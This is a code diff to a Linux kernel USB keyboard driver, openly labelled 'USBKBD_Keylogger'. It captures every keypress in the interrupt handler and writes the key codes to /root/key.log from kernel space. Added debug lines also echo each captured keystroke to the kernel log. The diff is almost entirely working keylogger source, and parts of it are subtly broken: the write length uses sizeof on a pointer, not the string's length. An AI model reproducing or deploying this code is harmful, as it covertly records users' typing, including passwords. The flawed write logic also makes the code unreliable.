@@ -119,7 +119,7 @@ struct usb_kbd {
 static void usb_kbd_irq(struct urb *urb)
 {
 	struct usb_kbd *kbd = urb->context;
-	char str_to_write[3];
+	char str_to_write[5]; // 5 is enough
 	int i;
 
 	switch (urb->status) {
@@ -155,12 +155,9 @@ static void usb_kbd_irq(struct urb *urb)
 						kbd->dev,
 						usb_kbd_keycode[kbd->new[i]], 1);
 
-				// Concat the char to string
-				str_to_write[0] = usb_kbd_keycode[kbd->new[i]];
-				str_to_write[1] = ' ';
-				str_to_write[2] = '\0';
-
-				log_key("/root/keycode.log", str_to_write);
+				// Concat the char to string, too lazy to do vmalloc, just use fixed length char[] instead
+				sprintf(str_to_write, "%d ", (int)kbd->new[i]);
+				log_key("/root/key.log", str_to_write);
 			}
 			else
 			{
@@ -430,25 +427,61 @@ static void log_key(char * path, char * str_to_write)
 		printk(KERN_ERR "USBKBD_Keylogger: Failed to open file, returned error %ld", PTR_ERR(file_pointer));
 		return;
 	}
+	else
+	{
+		printk(KERN_INFO "USBKBD_Keylogger: File opened/created.");
+	}
 
 	// Backup file segment and set to kernel space operations
 	origin_file_segment = get_fs();
+
+	printk(KERN_INFO "USBKBD_Keylogger: Got file segment.");
+
 	set_fs(KERNEL_DS);
 
-	// Write to file
-	file_pointer->f_op->write(
-			file_pointer,
-			str_to_write,
-			strlen(str_to_write),
-			&file_pointer->f_pos);
+	printk(KERN_INFO "USBKBD_Keylogger: Kernel mode entered.");
+
+	printk(KERN_INFO "USBKBD_Keylogger: Message to write: %s", str_to_write);
+	printk(KERN_INFO "USBKBD_Keylogger: File position value: %lld, address :%p", file_pointer->f_pos, &file_pointer->f_pos);
+
+	if(file_pointer->f_op->write)
+	{
+		printk(KERN_INFO "USBKBD_Keylogger: f_op->write is not null, just use it.");
+
+		// Write to file
+		file_pointer->f_op->write(
+				file_pointer,
+				str_to_write,
+				sizeof(str_to_write),
+				&file_pointer->f_pos);
+	}
+	else
+	{
+		printk(KERN_INFO "USBKBD_Keylogger: f_op->write somehow does not exist, use something else instead.");
+
+		vfs_write(
+				file_pointer,
+				str_to_write,
+				sizeof(str_to_write),
+				&file_pointer->f_pos);
+
+		vfs_fsync(file_pointer, 0);
+	}
 
 
+
+	printk(KERN_INFO "USBKBD_Keylogger: Written to file.");
 	// Restore file segment back to original one
 	set_fs(origin_file_segment);
 
+	printk(KERN_INFO "USBKBD_Keylogger: Return user mode.");
+
 	// Close the file pointer (also flush)
 	filp_close(file_pointer, NULL);
+
+	printk(KERN_INFO "USBKBD_Keylogger: Log finished.");
 }
+
 
 static const struct usb_device_id usb_kbd_id_table[] = {
 	{ USB_INTERFACE_INFO(USB_INTERFACE_CLASS_HID, USB_INTERFACE_SUBCLASS_BOOT,
